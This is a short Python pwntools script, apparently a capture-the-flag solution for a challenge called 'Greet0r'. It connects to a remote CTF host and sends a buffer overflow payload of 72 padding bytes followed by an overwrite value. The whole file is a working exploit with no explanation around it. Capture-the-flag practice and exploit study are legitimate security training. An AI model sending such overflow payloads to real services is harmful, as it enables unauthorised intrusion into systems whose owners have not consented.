#!/usr/bin/env python3

from pwn import *

# p = process('./Greet0r')
p = remote('meet-greet0r.nypinfsecctf.tk', 8003)

print(p.recv().decode())
p.sendline(b'A'*72 + b'\x06\x00\x00\x00')
print(p.recvall().decode())

p.close()